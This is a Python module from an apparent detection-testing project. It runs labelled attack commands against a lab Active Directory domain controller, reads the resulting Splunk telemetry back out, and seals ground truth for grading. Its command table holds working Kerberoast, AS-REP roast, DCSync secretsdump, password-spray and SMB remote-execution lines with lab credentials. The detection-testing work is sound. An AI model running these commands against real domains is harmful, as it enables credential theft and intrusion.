"""bully.inject_plane -- generate/inject/capture: the live plural data plane
(E.5, TASK_BULLY_UNIVERSAL_INTAKE_AND_INJECT_V1).

Permanent infrastructure, built once, reused forever: every future bully
run, every future universality claim, and the eventual training corpus draw
from it. It is the live sibling of `blend.py` (E.3) -- both emit records
carrying `__source_id` in the same shape, so field-role inference, the
artifact graph, and grading are identical downstream regardless of which
plane fed them.

**Generate.** Drive real activity in the lab through the tooling already
wired for authorized use (`portal.modules.security.core.lab.dispatch_lab_tool`,
the same dispatch the security-bench exec chains use against `portal.lab`)
-- labelled attack steps tagged at emission with
`(family, technique, chain_id, step_idx, injected=True)`.

**Capture.** Read activity back out of Splunk via the *existing*
`live_connect.SplunkQueryInPlaceConnector` (read path unchanged; this module
adds no write path to the grader's side). The captured records handed
downstream are raw and untagged -- Q3.

**Seal.** Ground truth is sealed through the existing sealed-ledger wall,
`specimen_ledger.SpecimenLedger` (`source_lane="live_lab"`), the same
mechanism `cousin_calibration_bench.py` already uses for blind-grade-then-
join truth. No second sealing mechanism is built here.

**Fail-closed.** If the lab is unreachable or a secret is missing, callers
get a clear, itemised reason and never a silent synthetic substitute --
`blend.py` is the explicit, stated fallback, never an implicit one.

I/O only through the existing `live_connect`/`lab` plumbing; no new
side-channel writes.
"""

from __future__ import annotations

import hashlib
import json
import os
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from . import corpus_bed, specimen_ledger
from .data_plane import DataPlane

ALGORITHM_VERSION = "inject-plane-v1"

# One small authorized command per (family, technique) -- run on the Kali
# attack host via dispatch_lab_tool("execute_bash", ...), the same dispatch
# path the security-bench exec chains already use against portal.lab.
# Sparse relative to the benign backdrop already flowing through the lab's
# Splunk index (Q4: every step is labelled at emission).
#
# R.5a (loop reintegration): extended from 2 to 8 chains across THREE
# vocabularies -- netexec/nxc, impacket, nmap -- reusing the SAME documented
# portal.lab credentials `capture_recipes.py`'s proven blue-validation
# recipes already use (administrator:LabAdmin1!, arya.stark:Winter1!,
# ned.stark, jon.snow, guest), so every command here is known-working
# against this lab, not a fresh guess. Kept single-purpose and read/recon-
# style (no persistence, no ACL writes) to match this module's existing
# minimal-footprint chains, unlike capture_recipes.py's multi-step blue-
# validation scenarios which intentionally create+delete a scheduled task.
_LIVE_CHAINS: tuple[dict[str, Any], ...] = (
    {
        "family": "discovery",
        "technique": "T1018",
        "chain_id": "live-discovery-T1018",
        "steps": (
            "nxc smb {dc} -u guest -p '' 2>&1 | head -20",
            "nxc smb {dc} --shares 2>&1 | head -20",
        ),
    },
    {
        "family": "credential_access_asrep",
        "technique": "T1558.004",
        "chain_id": "live-credaccess-T1558-asrep",
        "steps": (
            "nxc ldap {dc} -u guest -p '' --asreproast /tmp/bully_asrep.txt 2>&1 | head -20",
        ),
    },
    {
        "family": "credential_access_kerberoast",
        "technique": "T1558.003",
        "chain_id": "live-credaccess-T1558-kerberoast",
        "steps": (
            "impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip {dc} -request 2>&1 | head -20",
        ),
    },
    {
        "family": "credential_access_dcsync",
        "technique": "T1003.006",
        "chain_id": "live-credaccess-T1003-dcsync",
        "steps": (
            "impacket-secretsdump portal.lab/administrator:LabAdmin1!@{dc} -just-dc-ntlm 2>&1 | head -20",
        ),
    },
    {
        "family": "network_service_scan",
        "technique": "T1046",
        "chain_id": "live-discovery-T1046-nmap",
        "steps": ("nmap -sV -p 88,389,445 {dc} 2>&1 | head -30",),
    },
    {
        "family": "account_discovery",
        "technique": "T1087.002",
        "chain_id": "live-discovery-T1087-ldap",
        "steps": ("nxc ldap {dc} -u guest -p '' --users 2>&1 | head -20",),
    },
    {
        "family": "lateral_movement",
        "technique": "T1021.002",
        "chain_id": "live-lateral-T1021-smb",
        "steps": ("nxc smb {dc} -u administrator -p 'LabAdmin1!' -x whoami 2>&1 | head -20",),
    },
    {
        "family": "credential_access_spray",
        "technique": "T1110.003",
        "chain_id": "live-credaccess-T1110-spray",
        "steps": (
            "nxc smb {dc} -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1 | head -20",
        ),
    },
)


@dataclass(frozen=True)
class GenerateStep:
    family: str
    technique: str
    chain_id: str
    step_idx: int
    command: str
    result: dict[str, Any]

    @property
    def ok(self) -> bool:
        return bool(self.result.get("ok"))


@dataclass(frozen=True)
class GenerateReport:
    plane: str  # "live" | "unavailable"
    reason: str
    steps: tuple[GenerateStep, ...]

    @property
    def succeeded(self) -> bool:
        return self.plane == "live" and bool(self.steps) and all(s.ok for s in self.steps)

    def to_dict(self) -> dict[str, Any]:
        return {
            "plane": self.plane,
            "reason": self.reason,
            "steps": [
                {
                    "family": s.family,
                    "technique": s.technique,
                    "chain_id": s.chain_id,
                    "step_idx": s.step_idx,
                    "command": s.command,
                    "ok": s.ok,
                }
                for s in self.steps
            ],
        }


def lab_available() -> tuple[bool, str]:
    """Fail-closed reachability check -- never a silent substitute. Reuses
    the lab module's own gate rather than re-deriving one, and additionally
    requires the Splunk credential the capture side needs."""
    from .. import lab as lab_module

    if not getattr(lab_module, "_LAB_EXEC_AVAILABLE", False):
        return False, "lab exec MCP not available in this environment"
    if not os.environ.get("LAB_SPLUNK_PASSWORD"):
        return False, "LAB_SPLUNK_PASSWORD not set -- capture side would be unauthenticated"
    if not lab_module.verify_lab_targets_reachable(dry_run=False):
        return False, "lab DC/target reachability check failed"
    return True, ""


def generate_labelled_activity(
    *,
    dc_target: str | None = None,
    chains: tuple[dict[str, Any], ...] = _LIVE_CHAINS,
) -> GenerateReport:
    """Drive one small authorized command per labelled chain against the
    live lab. Fail-closed: returns `plane="unavailable"` with an itemised
    reason rather than fabricating a result."""
    available, reason = lab_available()
    if not available:
        return GenerateReport(plane="unavailable", reason=reason, steps=())

    from .. import lab as lab_module

    dc = dc_target or os.environ.get("LAB_TARGET_DC", "10.10.11.21")
    steps: list[GenerateStep] = []
    for chain in chains:
        for step_idx, template in enumerate(chain["steps"]):
            command = template.format(dc=dc)
            result = lab_module.dispatch_lab_tool("execute_bash", {"cmd": command})
            steps.append(
                GenerateStep(
                    family=chain["family"],
                    technique=chain["technique"],
                    chain_id=chain["chain_id"],
                    step_idx=step_idx,
                    command=command,
                    result=result,
                )
            )
    return GenerateReport(plane="live", reason="", steps=tuple(steps))


def _fingerprint(record: dict[str, Any]) -> str:
    digest = hashlib.sha256(json.dumps(record, sort_keys=True, default=str).encode()).hexdigest()
    return f"art-{digest[:16]}"


@dataclass(frozen=True)
class CaptureReport:
    plane: str  # "live" | "unavailable"
    reason: str
    records: tuple[dict[str, Any], ...]
    schemas_present: frozenset[str]
    bed_report: corpus_bed.BedReport | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "plane": self.plane,
            "reason": self.reason,
            "n_records": len(self.records),
            "schemas_present": sorted(self.schemas_present),
            "bed_report": self.bed_report.to_dict() if self.bed_report else None,
        }


def _index_count(connector: Any, index: str) -> int:
    """Cheap probe for one index's total event count -- used only to populate
    `corpus_bed.assess_bed`'s `records_available`, never to load records.

    `| eventcount summarize=false index=<index>` reads Splunk's own bucket
    metadata (a report command) rather than scanning events like
    `| stats count` (a full search over every event in the index). On a
    261M+ event corpus running on modest lab hardware (4 vCPU / 4GB LXC),
    `stats count` took minutes per index and made every bed assessment and
    every capture re-pay that cost; `eventcount` answers all four lane
    indexes in low single-digit seconds, verified live against this corpus."""
    from .connectors import QueryIntent

    result = connector.read(
        QueryIntent(
            "count telemetry for bed assessment",
            seed={"spl": f"| eventcount summarize=false index={index}"},
            limit=1,
        )
    )
    if not result.records:
        return 0
    first = result.records[0]
    fields = first.get("fields", {}) if isinstance(first, dict) else {}
    raw = fields.get("count") if isinstance(fields, dict) else None
    if raw is None and isinstance(first, dict):
        raw = first.get("count")
    try:
        return int(raw) if raw is not None else 0
    except (TypeError, ValueError):
        return 0


def _tag_captured_record(record: Any, *, index: str, schemas: set[str]) -> dict[str, Any] | None:
    if not isinstance(record, dict):
        return None
    fields = record.get("fields")
    event = dict(fields) if isinstance(fields, dict) else dict(record)
    # `SplunkBackend._run_search` promotes the event's own timestamp and
    # the first matching host-identity field (host/ComputerName/dest/
    # Computer/src) out of `fields` into `_time`/`host` on the wrapper --
    # the cleanest, already-parsed time and identity signal available.
    # Losing them here would leave only Splunk's own internal metadata
    # (_indextime, _bkt, _cd, ...) for role inference to work with.
    if record.get("host"):
        event.setdefault("host", record["host"])
    if record.get("_time") is not None:
        event.setdefault("_time", record["_time"])
    sourcetype = str(event.get("sourcetype") or "unknown")
    event["__source_id"] = f"lab-splunk:{sourcetype}"
    event["__index"] = index
    schemas.add(sourcetype)
    return event


def capture_records(
    *,
    plane: DataPlane | None = None,
    sample_limit: int = 500,
    indexes: tuple[str, ...] | None = None,
) -> CaptureReport:
    """Read activity back out of the lab's Splunk indexes via the existing
    `SplunkQueryInPlaceConnector` -- the read path this module adds no
    write path beside. Records are captured raw and untagged (Q3): no
    family/technique/injected label ever rides on a captured record.

    Reads across every index `corpus_bed.resolve_indexes()` names -- Lane B/C
    (`LAB_SPLUNK_INDEX`, default `portal5_lab`) plus Lane A's `botsv1`/
    `botsv2`/`botsv3` -- not the single hardcoded `portal5_lab` this function
    used to read exclusively (every bully run through D.4 could see only the
    `gen:*` synthetic universe it had just written itself; BOTS lives under a
    different index name and was invisible to a single-index capture).

    Queries each index with no `sourcetype` filter: a capture that can only
    ever see one schema can never prove plurality (Q2), and would silently
    miss the Windows-side telemetry (`windows:security`/`windows:sysmon`/
    `windows:powershell` etc.) the generated SMB/LDAP recon chains actually
    produce. Each Splunk search hit carries the real event under `fields`
    (the SDK's per-result payload minus the two fields the connector already
    promoted to `_time`/`host`); `fields["sourcetype"]` is the genuine
    per-record schema tag, used as `__source_id` so field-role inference and
    schema-plurality reporting are keyed on what was actually indexed, not a
    hardcoded guess. Every record also carries `__index` so downstream code
    (and `corpus_bed.assess_bed`) can attribute it to its lane.

    `corpus_bed.assess_bed(...)` is published on every run (`bed_report`) so
    a sample can never again be silently mistaken for a haystack.
    """
    available, reason = lab_available()
    if not available:
        return CaptureReport(
            plane="unavailable", reason=reason, records=(), schemas_present=frozenset()
        )

    from .connectors import QueryIntent
    from .live_connect import lab_splunk_connector

    target_indexes = indexes if indexes is not None else corpus_bed.resolve_indexes()

    captured: list[dict[str, Any]] = []
    schemas: set[str] = set()
    records_available: dict[str, int] = {}
    for index in target_indexes:
        connector = lab_splunk_connector(index=index)
        records_available[index] = _index_count(connector, index)
        # No explicit `sort -_time`: Splunk's default bucket-scan order for a
        # plain `search index=X` is already newest-bucket-first (verified
        # live against botsv3 -- the first two rows of an unsorted `| head 5`
        # come back at 2019-09-19 then 2018-08-20, correctly descending), so
        # `| head N` alone gets recent-first ordering without materializing
        # and sorting the whole index. On this corpus (261M+ events across
        # four indexes, 4 vCPU / 4GB lab hardware) an explicit `sort -_time`
        # measured ~173s for botsv1 (33M events) alone -- untenable when this
        # loop pays that cost per index, per run. `earliest`/`latest` are
        # deliberately left at this connector's defaults ("0"/"now"): this
        # lab's export endpoint was found (empirically, verified against the
        # live index) to return zero rows for any relative earliest bound
        # ("-30m", "-1h", "-24h" all returned 0 despite events with `_time`
        # timestamped at the moment of the query existing) -- a real quirk of
        # this lab's Splunk deployment (likely an indextime/eventtime skew on
        # the bulk-loaded corpus), not a defect in this connector's query
        # construction, and unrelated to the sort removal above.
        result = connector.read(
            QueryIntent(
                "capture recent telemetry, all sourcetypes",
                seed={"spl": f"search index={index}"},
                limit=sample_limit,
            )
        )
        for record in result.records:
            tagged = _tag_captured_record(record, index=index, schemas=schemas)
            if tagged is not None:
                captured.append(tagged)
        if result.records:
            active_plane = plane or DataPlane()
            active_plane.connect(
                f"lab-splunk-plural:{index}",
                connector,
                result.records,
                source_meta={
                    "record_class": "telemetry",
                    "credential_ref": "env:LAB_SPLUNK_PASSWORD",
                    "capabilities": {"queryable_in_place": True, "benign_present": True},
                },
            )

    # units_fitted/units_scored are unknown at capture time (T.2,
    # TASK_BULLY_REAL_TELEMETRY_V1 -- assess_bed now requires them): this is
    # a capture-only checkpoint, so 0/0 is honest, not a placeholder that
    # hides a real number. As of A5 (TASK_BULLY_ADAPTIVE_REACH_V1),
    # `scored_sample_too_small` DOES flip `is_haystack` to False here --
    # correctly: a checkpoint with zero scored units is not standing on a
    # haystack yet, whatever the corpus behind it contains (I.6 published
    # `is_haystack: true` with 0 scored units). The caller re-assesses with
    # the real fitted/scored counts once known, and `is_haystack` can only
    # become True once a real scored population exists.
    bed = corpus_bed.assess_bed(
        records_available, records_read=len(captured), units_fitted=0, units_scored=0
    )
    if not captured:
        return CaptureReport(
            plane="live",
            reason="capture returned zero records",
            records=(),
            schemas_present=frozenset(),
            bed_report=bed,
        )
    return CaptureReport(
        plane="live",
        reason="",
        records=tuple(captured),
        schemas_present=frozenset(schemas),
        bed_report=bed,
    )


class _SplunkPaginatedFetcher:
    """`.fetch(offset, limit)` adapter over `SplunkQueryInPlaceConnector` for
    `corpus_bed.stream_corpus`.

    Time-windowed, not row-offset (F.4 fix, TASK_BULLY_FULL_ASSEMBLY_V1): the
    original `sort -_time | head (offset+limit) | tail limit` idiom forces
    Splunk to re-materialize `offset+limit` rows on EVERY call -- O(n) per
    page, O(n^2/batch_size) total across a full corpus walk. Measured live
    against the 281M-record corpus: the first ~347 batches (offset 0 to
    3.47M) took ~50 minutes; the NEXT single batch alone ran past 13 hours
    before being killed, with Splunk's own job log showing that one query
    (`head 3480000 | tail 10000`) actively running the whole time -- not
    hung, just genuinely O(offset) per call. At that growth rate the
    smallest index alone was on a multi-day trajectory and the 226M-row
    `botsv2` index would not have finished within any plausible run.

    Each call instead asks for a bounded TIME WINDOW, independent of how far
    into the index the walk has progressed: window width is estimated once,
    from the index's own event count and time range (`_index_count`/
    `discover_index_range`), as `span * limit / count`, so each window holds
    roughly `limit` events on data with a reasonably even time distribution.
    Real telemetry is bursty, so a window returning nothing is EXPANDED
    (doubled) rather than treated as exhaustion; results inside a window are
    still capped with a generous `head` as a safety net, but the window --
    never the corpus position -- bounds each query's cost."""

    def __init__(self, index: str) -> None:
        from .live_connect import lab_splunk_connector

        self.index = index
        self._connector = lab_splunk_connector(index=index)
        self._cursor: float | None = None
        self._latest: float | None = None
        self._window_seconds: float = 3600.0
        self._exhausted = False

    def _ensure_bounds(self, limit: int) -> None:
        if self._cursor is not None or self._exhausted:
            return
        rng = discover_index_range(self._connector, self.index)
        if rng.earliest is None or rng.latest is None or rng.earliest >= rng.latest:
            self._exhausted = True
            return
        count = _index_count(self._connector, self.index)
        span = rng.latest - rng.earliest
        density = (count / span) if span > 0 else 0.0
        window = (limit / density) if density > 0 else span
        self._window_seconds = max(1.0, min(window, span))
        self._cursor = rng.earliest
        self._latest = rng.latest

    def fetch(self, *, offset: int, limit: int) -> list[dict[str, Any]]:
        from .connectors import QueryIntent

        self._ensure_bounds(limit)
        if self._exhausted or self._cursor is None or self._latest is None:
            return []
        window = self._window_seconds
        out: list[dict[str, Any]] = []
        while True:
            t0 = self._cursor
            t1 = min(self._latest, t0 + window)
            # A run over the whole corpus spans hours; a transient network
            # blip (F.4 finding: a `ConnectTimeout` after ~18 hours and
            # 105,958,787 real records) should not cost the batch it landed
            # on. Three attempts, short exponential backoff.
            result = None
            last_exc: Exception | None = None
            for attempt in range(3):
                try:
                    result = self._connector.read(
                        QueryIntent(
                            f"stream corpus batch window={t0}-{t1}",
                            seed={"spl": f"search index={self.index} | head {limit * 3}"},
                            start=t0,
                            end=t1,
                            limit=limit * 3,
                        )
                    )
                    break
                except Exception as exc:  # noqa: BLE001 -- retry transient transport errors
                    last_exc = exc
                    if attempt < 2:
                        time.sleep(2.0 * (4**attempt))
            if result is None:
                raise last_exc if last_exc else RuntimeError("fetch failed with no exception")
            schemas: set[str] = set()
            out = []
            for record in result.records:
                tagged = _tag_captured_record(record, index=self.index, schemas=schemas)
                if tagged is not None:
                    out.append(tagged)
            reached_end = t1 >= self._latest
            if out or reached_end:
                self._cursor = t1
                if reached_end:
                    self._exhausted = True
                break
            # A window with nothing in it (sparse period) doubles rather
            # than signalling exhaustion -- exhaustion is only ever "the
            # window reached the index's real latest bound".
            window = window * 4
        return out


def stream_captured_records(
    *,
    indexes: tuple[str, ...] | None = None,
    batch_size: int = 10_000,
    max_records: int | None = None,
) -> Any:
    """Stream captured records across every corpus lane in batches, built on
    `corpus_bed.stream_corpus` -- millions of records processed without ever
    being loaded whole. Callers fit a baseline incrementally from this
    stream; scoring may then sample a subset (fit wide, score narrow)."""
    target_indexes = indexes if indexes is not None else corpus_bed.resolve_indexes()
    return corpus_bed.stream_corpus(
        _SplunkPaginatedFetcher,
        target_indexes,
        batch_size=batch_size,
        max_records=max_records,
    )


def seal_ground_truth(
    generate_report: GenerateReport,
    captured_records: tuple[dict[str, Any], ...],
    *,
    root: Path | None = None,
) -> int:
    """Seal every generated step's ground truth through the existing
    `SpecimenLedger` wall (Q3) -- `source_lane="live_lab"`. Captured records
    join to their provenance only by fingerprint, strictly after grading;
    this function never hands truth to a grader.

    `specimen_id` is scoped to this run (a random run-local suffix), not
    just `chain_id`/`step_idx`: this is permanent infrastructure meant to be
    run repeatedly (module docstring), and `_LIVE_CHAINS`' chain ids are
    fixed literals, so a bare `f"{chain_id}-step{step_idx}"` would collide
    with -- and correctly be refused by -- the previous run's already-sealed
    entry every time this runs again. `SpecimenLedger.record` is otherwise
    idempotent on identical content; run-scoping keeps each real run's truth
    distinct rather than making every run after the first raise."""
    ledger = specimen_ledger.SpecimenLedger(root)
    sealed = 0
    run_id = uuid.uuid4().hex[:12]
    captured_by_fingerprint = {_fingerprint(r): r for r in captured_records}
    for step in generate_report.steps:
        specimen_id = f"{step.chain_id}-step{step.step_idx}-run{run_id}"
        matched_fingerprint = next(
            (
                fp
                for fp, rec in captured_by_fingerprint.items()
                if step.command in json.dumps(rec, default=str)
            ),
            None,
        )
        record = specimen_ledger.SpecimenRecord(
            specimen_id=specimen_id,
            parent_id=step.chain_id,
            source_lane="live_lab",
            construction_distance=0.0,
            data_yml_techniques=(step.technique,),
            created_at=time.time(),
            provenance={
                "family": step.family,
                "technique": step.technique,
                "chain_id": step.chain_id,
                "step_idx": step.step_idx,
                "injected": True,
                "matched_fingerprint": matched_fingerprint,
            },
        )
        ledger.record(record)
        sealed += 1
    return sealed


@dataclass(frozen=True)
class InjectCaptureRun:
    plane: str  # "live" | "fixture"
    reason: str
    records: tuple[dict[str, Any], ...]
    sealed_count: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "plane": self.plane,
            "reason": self.reason,
            "n_records": len(self.records),
            "sealed_count": self.sealed_count,
        }


def run_inject_capture(*, ledger_root: Path | None = None) -> InjectCaptureRun:
    """The E.5 orchestrator. Fail-closed and honest: if the live plane is
    unavailable, falls back to the E.3 fixture and states plainly that the
    fixture, not a live capture, produced the returned records -- never a
    silent synthetic substitute for what looks like a live run."""
    generate_report = generate_labelled_activity()
    if generate_report.plane != "live":
        from . import blend

        records, _provenance = blend.compose_blend()
        return InjectCaptureRun(
            plane="fixture",
            reason=f"live plane unavailable: {generate_report.reason}",
            records=tuple(records),
            sealed_count=0,
        )

    capture_report = capture_records()
    if capture_report.plane != "live" or not capture_report.records:
        from . import blend

        records, _provenance = blend.compose_blend()
        reason = capture_report.reason or "live capture returned no records"
        return InjectCaptureRun(
            plane="fixture",
            reason=f"live capture unavailable: {reason}",
            records=tuple(records),
            sealed_count=0,
        )

    sealed = seal_ground_truth(generate_report, capture_report.records, root=ledger_root)
    return InjectCaptureRun(
        plane="live", reason="", records=capture_report.records, sealed_count=sealed
    )


# ── I.3: capture driven by bounded investigations, not a slab scan ─────────

_ENTITY_FIELDS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("user", ("user", "src_user", "userIdentity", "Account_Name", "user_name", "TargetUserName")),
    ("host", ("host", "ComputerName", "dest", "Computer", "src_host")),
    ("ip", ("src_ip", "dest_ip", "ip", "sourceIPAddress")),
    ("process", ("process", "Image", "new_process_name")),
    ("hash", ("hash", "md5", "sha256", "file_hash")),
    ("resource", ("bucket", "resource", "arn", "bucketName", "requestParameters.bucketName")),
)


def _extract_pivot_entities(record: dict[str, Any]) -> list[tuple[str, str]]:
    """Generic, sourcetype-AGNOSTIC entity extraction from a captured
    record's already-flattened event body -- looked up BY FIELD NAME across
    common real schemas (Windows, AWS, Linux, network), never by sourcetype,
    so a pivot can reach a related entity regardless of which schema it
    surfaces under. This is what links stages that share no identifier
    (`web_admin` in `aws:cloudtrail`, `BSTOLL-L` in `xmlwineventlog:sysmon`)."""
    out: list[tuple[str, str]] = []
    for kind, fields in _ENTITY_FIELDS:
        for f in fields:
            value = record.get(f)
            if value:
                out.append((kind, str(value)))
    return out


@dataclass(frozen=True)
class IndexRange:
    """An index's REAL discovered time bounds -- never assumed, always
    queried live (`| tstats min(_time) max(_time)`, the one legitimate
    unbounded use besides `eventcount`: bucket metadata, not a scan)."""

    index: str
    earliest: float | None
    latest: float | None

    def to_dict(self) -> dict[str, Any]:
        return {"index": self.index, "earliest": self.earliest, "latest": self.latest}


def discover_index_range(connector: Any, index: str) -> IndexRange:
    from .connectors import QueryIntent

    result = connector.read(
        QueryIntent(
            "discover corpus index time range",
            seed={"spl": f"| tstats min(_time) as first max(_time) as last where index={index}"},
            limit=1,
        )
    )
    if not result.records:
        return IndexRange(index, None, None)
    first_row = result.records[0]
    fields = first_row.get("fields", {}) if isinstance(first_row, dict) else {}

    def _to_float(raw: Any) -> float | None:
        try:
            return float(raw) if raw is not None else None
        except (TypeError, ValueError):
            return None

    return IndexRange(
        index,
        _to_float(fields.get("first")),
        _to_float(fields.get("last")),
    )


@dataclass(frozen=True)
class InvestigationCaptureReport:
    """The result of running one or more anchor-pivot investigations across
    the corpus's real time range, in place of one unbounded slab scan."""

    plane: str
    reason: str
    investigations: tuple[Any, ...]  # investigation_pivot.Investigation
    index_ranges: dict[str, IndexRange]
    bed_report: corpus_bed.BedReport | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "plane": self.plane,
            "reason": self.reason,
            "n_investigations": len(self.investigations),
            "index_ranges": {k: v.to_dict() for k, v in self.index_ranges.items()},
            "investigations": [inv.to_dict() for inv in self.investigations],
            "bed_report": self.bed_report.to_dict() if self.bed_report else None,
        }


def capture_investigation(
    anchors: list[Any],  # investigation_pivot.Anchor
    *,
    indexes: tuple[str, ...] | None = None,
    **investigate_kwargs: Any,
) -> InvestigationCaptureReport:
    """Reconstruct one incident per anchor by recursive, bounded, entity-
    scoped pivoting -- the replacement for `capture_records`'s single
    `search index=X | head N` slab scan.

    Every index's REAL time bounds are discovered first and every
    investigation is clamped to its anchor index's bounds (I5): an
    investigation cannot wander outside the data it is meant to explain, and
    a cousin injected outside that range is provably unreachable rather than
    silently missed. No query issued here ever filters by `sourcetype` (I6).
    """
    from . import investigation_pivot as ip
    from .connectors import QueryIntent
    from .live_connect import lab_splunk_connector

    available, reason = lab_available()
    if not available:
        return InvestigationCaptureReport(
            plane="unavailable", reason=reason, investigations=(), index_ranges={}
        )

    target_indexes = indexes if indexes is not None else corpus_bed.resolve_indexes()
    connectors = {idx: lab_splunk_connector(index=idx) for idx in target_indexes}
    index_ranges = {idx: discover_index_range(connectors[idx], idx) for idx in target_indexes}

    records_available: dict[str, int] = {}
    total_captured = 0

    def execute(query: Any) -> list[dict[str, Any]]:
        nonlocal total_captured
        connector = connectors[query.index]
        result = connector.read(
            QueryIntent(
                "anchor-pivot investigation",
                start=query.earliest,
                end=query.latest,
                entities=(query.entity,),
            )
        )
        schemas: set[str] = set()
        out: list[dict[str, Any]] = []
        for record in result.records:
            tagged = _tag_captured_record(record, index=query.index, schemas=schemas)
            if tagged is not None:
                out.append(tagged)
        total_captured += len(out)
        return out

    investigations = []
    for anchor in anchors:
        rng = index_ranges.get(anchor.index) if anchor.index else None
        inv = ip.investigate(
            anchor,
            list(target_indexes),
            execute,
            _extract_pivot_entities,
            corpus_earliest=rng.earliest if rng else None,
            corpus_latest=rng.latest if rng else None,
            **investigate_kwargs,
        )
        investigations.append(inv)

    for idx in target_indexes:
        records_available[idx] = _index_count(connectors[idx], idx)
    bed = corpus_bed.assess_bed(
        records_available, records_read=total_captured, units_fitted=0, units_scored=0
    )
    return InvestigationCaptureReport(
        plane="live",
        reason="",
        investigations=tuple(investigations),
        index_ranges=index_ranges,
        bed_report=bed,
    )
